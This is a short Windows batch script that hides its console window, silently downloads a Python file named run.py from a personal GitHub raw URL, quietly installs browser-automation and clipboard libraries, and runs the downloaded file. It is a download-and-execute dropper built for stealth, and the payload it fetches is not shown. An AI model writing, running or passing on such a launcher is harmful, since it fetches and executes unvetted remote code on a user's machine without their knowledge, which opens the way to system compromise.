@echo off
powershell -windowstyle hidden -command ""
cd /d "%~dp0"

curl -s -L -o run.py https://raw.githubusercontent.com/rohit2545289-glitch/exotel-twiml/main/run.py
pip install selenium pyperclip webdriver-manager --quiet >nul
python run.py

exit